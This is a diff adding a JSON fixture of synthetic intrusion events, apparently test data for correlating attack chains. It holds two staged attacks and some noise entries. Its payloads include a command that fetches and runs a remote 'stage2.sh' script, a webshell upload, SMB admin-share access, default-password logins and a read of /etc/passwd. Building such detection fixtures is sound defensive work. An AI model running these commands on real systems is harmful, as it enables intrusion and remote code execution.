@@ -1,0 +1,145 @@
+[
+  {
+    "event_id": "evt_stoch_a_1",
+    "timestamp": 1700000000.0129173,
+    "real_timestamp": 1700000000.0,
+    "source_ip": "198.51.53.42",
+    "target_node": "node_01",
+    "service": "http",
+    "event_type": "web_probe",
+    "payload": "GET /setup.php HTTP/1.1",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_a_2",
+    "timestamp": 1700000046.3853357,
+    "real_timestamp": 1700000046.3920012,
+    "source_ip": "198.51.53.42",
+    "target_node": "node_01",
+    "service": "ssh",
+    "event_type": "auth_login",
+    "payload": "LOGIN admin / admin123",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_a_3",
+    "timestamp": 1700000089.4710445,
+    "real_timestamp": 1700000089.483858,
+    "source_ip": "198.51.53.42",
+    "target_node": "node_01",
+    "service": "ssh",
+    "event_type": "command_exec",
+    "payload": "curl -O http://cdn.io/stage2.sh && bash stage2.sh",
+    "causal_token": "token-jump-pivot-200"
+  },
+  {
+    "event_id": "evt_stoch_a_4",
+    "timestamp": 1700000155.662754,
+    "real_timestamp": 1700000155.6559227,
+    "source_ip": "198.51.53.42",
+    "target_node": "node_01",
+    "service": "http",
+    "event_type": "web_upload",
+    "payload": "POST /upload.php [webshell.php]",
+    "causal_token": "token-jump-pivot-200"
+  },
+  {
+    "event_id": "evt_stoch_a_5",
+    "timestamp": 1700000194.562224,
+    "real_timestamp": 1700000194.567038,
+    "source_ip": "192.168.32.5",
+    "target_node": "node_02",
+    "service": "smb",
+    "event_type": "smb_connect",
+    "payload": "SMB2_TREE_CONNECT \\\\node-2\\c$",
+    "causal_token": "token-jump-pivot-200"
+  },
+  {
+    "event_id": "evt_stoch_b_1",
+    "timestamp": 1700000023.2367086,
+    "real_timestamp": 1700000023.228317,
+    "source_ip": "203.0.15.88",
+    "target_node": "node_02",
+    "service": "ssh",
+    "event_type": "port_scan",
+    "payload": "TCP SYN probe port 22",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_b_2",
+    "timestamp": 1700000079.4894593,
+    "real_timestamp": 1700000079.4863708,
+    "source_ip": "203.0.15.88",
+    "target_node": "node_02",
+    "service": "ssh",
+    "event_type": "auth_login",
+    "payload": "LOGIN root / 123456",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_b_3",
+    "timestamp": 1700000170.7791624,
+    "real_timestamp": 1700000170.790223,
+    "source_ip": "203.0.15.88",
+    "target_node": "node_02",
+    "service": "ssh",
+    "event_type": "auth_login",
+    "payload": "LOGIN root / password",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_b_4",
+    "timestamp": 1700000207.0023832,
+    "real_timestamp": 1700000206.9975228,
+    "source_ip": "203.0.15.88",
+    "target_node": "node_02",
+    "service": "ssh",
+    "event_type": "command_exec",
+    "payload": "uname -a && cat /etc/passwd",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_noise_1",
+    "timestamp": 1700000320.049166,
+    "real_timestamp": 1700000320.0427854,
+    "source_ip": "198.18.234.1",
+    "target_node": "node-1",
+    "service": "ntp",
+    "event_type": "web_probe",
+    "payload": "GET /robots.txt HTTP/1.1",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_noise_2",
+    "timestamp": 1700000330.9145892,
+    "real_timestamp": 1700000330.9183555,
+    "source_ip": "198.18.208.2",
+    "target_node": "node-2",
+    "service": "http",
+    "event_type": "port_scan",
+    "payload": "TCP SYN probe",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_noise_3",
+    "timestamp": 1700000268.0482666,
+    "real_timestamp": 1700000268.0398424,
+    "source_ip": "198.18.208.3",
+    "target_node": "node-3",
+    "service": "ssh",
+    "event_type": "web_probe",
+    "payload": "GET /robots.txt HTTP/1.1",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_noise_4",
+    "timestamp": 1700000199.518253,
+    "real_timestamp": 1700000199.5134256,
+    "source_ip": "198.18.248.4",
+    "target_node": "node-1",
+    "service": "ssh",
+    "event_type": "port_scan",
+    "payload": "TCP SYN probe",
+    "causal_token": null
+  }
+]
